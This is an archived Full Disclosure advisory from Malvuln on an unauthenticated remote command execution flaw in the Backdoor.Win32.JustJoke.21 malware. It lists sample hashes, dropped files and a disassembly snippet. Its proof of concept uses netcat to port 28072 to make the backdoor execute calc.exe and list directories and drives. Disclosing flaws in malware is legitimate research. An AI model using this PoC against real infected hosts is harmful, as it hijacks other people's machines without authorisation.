---
title: Backdoor.Win32.JustJoke.21 (BackDoor Pro) / Unauthenticated Remote Command Execution
url: https://seclists.org/fulldisclosure/2024/Sep/14
source: Full Disclosure
date: 2024-09-07
fetch_date: 2025-10-06T18:31:14.363409
---

# Backdoor.Win32.JustJoke.21 (BackDoor Pro) / Unauthenticated Remote Command Execution

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.JustJoke.21 (BackDoor Pro) / Unauthenticated Remote Command Execution

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Tue, 3 Sep 2024 21:14:30 -0400

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source:
https://malvuln.com/advisory/4dc39c05bcc93e600dd8de16f2f7c599.txt
Contact: malvuln13 () gmail com
Media: x.com/malvuln

Threat: Backdoor.Win32.JustJoke.21 (BackDoor Pro - v2.0b4)
Vulnerability: Unauthenticated Remote Command Execution
Family: JustJoke
Type: PE32
MD5: 4dc39c05bcc93e600dd8de16f2f7c599
SHA256: 55662483e663bde98d729489c6b25986003a40df1e2be376b0c3b20d2d6c7987
Vuln ID: MVID-2024-0689
Dropped files: Scanvegw.exe
Disclosure: 09/03/2024
Description: The malware listens on TCP port 28072.  Upon execution,
throws an error alert dialog with message: "File DATA1.CAB not
found!". The backdoor then drops a hidden PE file named "Scanvegw.exe"
in SysWoW64 use attrib -s -h. The malware then makes outbound
connections to SMTP port 25. Hit enter twice when sending commands use
"E" for Execute and "T" for Terminate. Calling programs incorrectly
still gives a response of "Executed!" when it actually fails. The
malware calls Win32 WinExec API, supply full path to the file.

0046A0CC                 push    eax             ; lpCmdLine
0046A0CD                 call    WinExec
0046A0D2                 push    offset aTmp     ; "tmp!?!"
0046A0D7                 push    [ebp+var_C]
0046A0DA                 push    offset aExecuted ; " Executed!"
0046A0DF                 lea     eax, [ebp+var_168]
0046A0E5                 mov     edx, 3
0046A0EA                 call    sub_40495C

Exploit/PoC:
nc64.exe x.x.x.x 28072
E "c:\\Windows\\System32\\calc.exe";
tmp!?!"c:\\Windows\\System32\\calc.exe";
Executed!
E GetDir;
tmp!?!GetDir;
 Executed!
GetDir;C:\WINDOWS\system32
@AudioToastIcon.png
@EnrollmentToastIcon.png
@VpnToastIcon.png
@WirelessDisplayToast.png
aadauthhelper.dll
aadtb.dll
AboveLockAppHost.dll
accessibilitycpl.dll

E GetDrive;
tmp!?!GetDrive;
 Executed!GetDrive;c:
d:
GetFiles;
GetSpace;

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or
otherwise. Permission is hereby granted for the redistribution of this
advisory, provided that it is not altered except by reformatting it,
and that due credit is given. Permission is explicitly given for
insertion in vulnerability databases and similar, provided that due
credit is given to the author. The author is not responsible for any
misuse of the information contained herein and accepts no
responsibility for any damage caused by the use or misuse of this
information. The author prohibits any malicious use of security
related information or exploits by the author or elsewhere. Do not
attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper
Malware handling or the downloading of ANY Malware mentioned on this
website or elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

### Current thread:

* **Backdoor.Win32.JustJoke.21 (BackDoor Pro) / Unauthenticated Remote Command Execution** *malvuln (Sep 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")